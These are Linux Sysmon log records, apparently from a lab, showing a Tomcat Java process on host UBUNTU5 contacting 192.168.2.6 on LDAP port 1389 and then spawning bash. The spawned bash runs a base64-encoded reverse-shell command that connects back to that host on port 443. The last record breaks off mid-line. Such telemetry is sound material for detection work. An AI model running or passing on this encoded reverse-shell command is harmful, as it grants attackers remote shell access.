{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:20.4Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:20Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e5\u003c/EventID\u003e\u003cVersion\u003e3\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e5\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:20.399931000Z\"/\u003e\u003cEventRecordID\u003e245753\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:20.395\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-f5aa-627b-082b-60e4b9550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1774\u003c/Data\u003e\u003cData Name=\"Image\"\u003ewdavdaemon\u003c/Data\u003e\u003cData Name=\"User\"\u003eroot\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:20.467Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:20Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e3\u003c/EventID\u003e\u003cVersion\u003e5\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e3\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:20.465735000Z\"/\u003e\u003cEventRecordID\u003e245754\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:20.472\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-f5aa-627b-082b-60e4b9550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1774\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/opt/microsoft/mdatp/sbin/wdavdaemon\u003c/Data\u003e\u003cData Name=\"User\"\u003eroot\u003c/Data\u003e\u003cData Name=\"Protocol\"\u003etcp\u003c/Data\u003e\u003cData Name=\"Initiated\"\u003etrue\u003c/Data\u003e\u003cData Name=\"SourceIsIpv6\"\u003efalse\u003c/Data\u003e\u003cData Name=\"SourceIp\"\u003e192.168.2.5\u003c/Data\u003e\u003cData Name=\"SourceHostname\"\u003e-\u003c/Data\u003e\u003cData Name=\"SourcePort\"\u003e51492\u003c/Data\u003e\u003cData Name=\"SourcePortName\"\u003e-\u003c/Data\u003e\u003cData Name=\"DestinationIsIpv6\"\u003efalse\u003c/Data\u003e\u003cData Name=\"DestinationIp\"\u003e104.46.127.225\u003c/Data\u003e\u003cData Name=\"DestinationHostname\"\u003e-\u003c/Data\u003e\u003cData Name=\"DestinationPort\"\u003e443\u003c/Data\u003e\u003cData Name=\"DestinationPortName\"\u003e-\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:21.397Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:21Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e5\u003c/EventID\u003e\u003cVersion\u003e3\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e5\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:21.395660000Z\"/\u003e\u003cEventRecordID\u003e245755\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:21.402\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-f5a5-627b-b809-87f375550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1340\u003c/Data\u003e\u003cData Name=\"Image\"\u003ejava\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:21.637Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:21Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e11\u003c/EventID\u003e\u003cVersion\u003e2\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e11\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:21.635471000Z\"/\u003e\u003cEventRecordID\u003e245756\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:21.642\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-f5a5-627b-b809-87f375550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1340\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003e/opt/tomcat/logs/vulnapp-2.14.0.log\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2022-05-11 18:10:21.642\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:21.637Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:21Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e11\u003c/EventID\u003e\u003cVersion\u003e2\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e11\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:21.638531000Z\"/\u003e\u003cEventRecordID\u003e245757\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:21.645\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-f5a5-627b-b809-87f375550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1340\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003e/opt/tomcat/logs/vulnapp-2.14.0.log\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2022-05-11 18:10:21.645\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:21.787Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:21Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e3\u003c/EventID\u003e\u003cVersion\u003e5\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e3\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:21.783984000Z\"/\u003e\u003cEventRecordID\u003e245758\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:21.790\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-f5a5-627b-b809-87f375550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1340\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003cData Name=\"Protocol\"\u003etcp\u003c/Data\u003e\u003cData Name=\"Initiated\"\u003etrue\u003c/Data\u003e\u003cData Name=\"SourceIsIpv6\"\u003efalse\u003c/Data\u003e\u003cData Name=\"SourceIp\"\u003e192.168.2.5\u003c/Data\u003e\u003cData Name=\"SourceHostname\"\u003e-\u003c/Data\u003e\u003cData Name=\"SourcePort\"\u003e41696\u003c/Data\u003e\u003cData Name=\"SourcePortName\"\u003e-\u003c/Data\u003e\u003cData Name=\"DestinationIsIpv6\"\u003efalse\u003c/Data\u003e\u003cData Name=\"DestinationIp\"\u003e192.168.2.6\u003c/Data\u003e\u003cData Name=\"DestinationHostname\"\u003e-\u003c/Data\u003e\u003cData Name=\"DestinationPort\"\u003e1389\u003c/Data\u003e\u003cData Name=\"DestinationPortName\"\u003e-\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:21.92Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:21Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e3\u003c/EventID\u003e\u003cVersion\u003e5\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e3\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:21.919490000Z\"/\u003e\u003cEventRecordID\u003e245759\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:21.925\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-f5a5-627b-b809-87f375550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1340\u003c/Data\u003e\u003cData Name=\"Image\"\u003ejava\u003c/Data\u003e\u003cData Name=\"User\"\u003e-\u003c/Data\u003e\u003cData Name=\"Protocol\"\u003etcp\u003c/Data\u003e\u003cData Name=\"Initiated\"\u003etrue\u003c/Data\u003e\u003cData Name=\"SourceIsIpv6\"\u003efalse\u003c/Data\u003e\u003cData Name=\"SourceIp\"\u003e192.168.2.5\u003c/Data\u003e\u003cData Name=\"SourceHostname\"\u003e-\u003c/Data\u003e\u003cData Name=\"SourcePort\"\u003e41878\u003c/Data\u003e\u003cData Name=\"SourcePortName\"\u003e-\u003c/Data\u003e\u003cData Name=\"DestinationIsIpv6\"\u003efalse\u003c/Data\u003e\u003cData Name=\"DestinationIp\"\u003e192.168.2.6\u003c/Data\u003e\u003cData Name=\"DestinationHostname\"\u003e-\u003c/Data\u003e\u003cData Name=\"DestinationPort\"\u003e8888\u003c/Data\u003e\u003cData Name=\"DestinationPortName\"\u003e-\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.003Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e1\u003c/EventID\u003e\u003cVersion\u003e5\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e1\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.003485000Z\"/\u003e\u003cEventRecordID\u003e245760\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:21.998\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-fc0d-627b-4874-61f901560000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e17790\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/bin/bash\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e-\u003c/Data\u003e\u003cData Name=\"Description\"\u003e-\u003c/Data\u003e\u003cData Name=\"Product\"\u003e-\u003c/Data\u003e\u003cData Name=\"Company\"\u003e-\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003e-\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003ebash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQo=}|{base64,-d}|{bash,-i}\u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003e/\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{94325212-0000-0000-e903-000000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e1001\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e4294967295\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eno level\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003e-\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{94325212-f5a5-627b-b809-87f375550000}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e1340\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003e/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003e/usr/lib/jvm/java-1.8.0-openjdk-amd64/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Djava.net.preferIPv4Stack=true -Djava.net.preferIPv4Addresses=true -Djava.awt.headless=true -Djdk.tls.ephemeralDHKeySize=2048 -Xms512M -Xmx1024M -server -XX:+UseParallelGC -classpath /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/opt/tomcat -","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.013Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e5\u003c/EventID\u003e\u003cVersion\u003e3\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e5\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.013968000Z\"/\u003e\u003cEventRecordID\u003e245761\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.020\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-fc0e-627b-0000-000000000000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e17792\u003c/Data\u003e\u003cData Name=\"Image\"\u003e\u0026lt unknown process\u0026gt \u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.017Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e1\u003c/EventID\u003e\u003cVersion\u003e5\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e1\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.016835000Z\"/\u003e\u003cEventRecordID\u003e245762\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.018\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-fc0e-627b-4804-97a36d550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e17794\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/bin/bash\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e-\u003c/Data\u003e\u003cData Name=\"Description\"\u003e-\u003c/Data\u003e\u003cData Name=\"Product\"\u003e-\u003c/Data\u003e\u003cData Name=\"Company\"\u003e-\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003e-\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003ebash -i\u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003e/\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{94325212-0000-0000-e903-000000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e1001\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e4294967295\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eno level\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003e-\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{94325212-fc0d-627b-4874-61f901560000}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e17790\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003e/bin/bash\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003ebash\u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003etomcat\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.023Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e1\u003c/EventID\u003e\u003cVersion\u003e5\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e1\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.022858000Z\"/\u003e\u003cEventRecordID\u003e245763\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" ThreadID=\"1590\"/\u003e\u003cChannel\u003eLinux-Sysmon/Operational\u003c/Channel\u003e\u003cComputer\u003eUBUNTU5\u003c/Computer\u003e\u003cSecurity UserId=\"0\"/\u003e\u003c/System\u003e\u003cEventData\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2022-05-11 18:10:22.017\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{94325212-fc0e-627b-a804-43f5d5550000}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e17793\u003c/Data\u003e\u003cData Name=\"Image\"\u003e/usr/bin/base64\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e-\u003c/Data\u003e\u003cData Name=\"Description\"\u003e-\u003c/Data\u003e\u003cData Name=\"Product\"\u003e-\u003c/Data\u003e\u003cData Name=\"Company\"\u003e-\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003e-\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003ebase64 -d\u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003e/\u003c/Data\u003e\u003cData Name=\"User\"\u003etomcat\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{94325212-0000-0000-e903-000000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e1001\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e4294967295\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eno level\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003e-\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{94325212-fc0d-627b-4874-61f901560000}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e17790\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003e/bin/bash\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003ebash\u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003etomcat\u003c/Data\u003e\u003c/EventData\u003e\u003c/Event\u003e","HostIP":"192.168.2.5","ProcessName":"sysmon","MG":"00000000-0000-0000-0000-000000000002","Type":"Syslog","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/ubuntu5"}
{"TenantId":"redacted","SourceSystem":"Linux","TimeGenerated":"2022-05-11T18:10:22.027Z","Computer":"UBUNTU5","EventTime":"2022-05-11T18:10:22Z","Facility":"user","HostName":"UBUNTU5","SeverityLevel":"info","SyslogMessage":"\u003cEvent\u003e\u003cSystem\u003e\u003cProvider Name=\"Linux-Sysmon\" Guid=\"{ff032593-a8d3-4f13-b0d6-01fc615a0f97}\"/\u003e\u003cEventID\u003e5\u003c/EventID\u003e\u003cVersion\u003e3\u003c/Version\u003e\u003cLevel\u003e4\u003c/Level\u003e\u003cTask\u003e5\u003c/Task\u003e\u003cOpcode\u003e0\u003c/Opcode\u003e\u003cKeywords\u003e0x8000000000000000\u003c/Keywords\u003e\u003cTimeCreated SystemTime=\"2022-05-11T18:10:22.028290000Z\"/\u003e\u003cEventRecordID\u003e245765\u003c/EventRecordID\u003e\u003cCorrelation/\u003e\u003cExecution ProcessID=\"1590\" 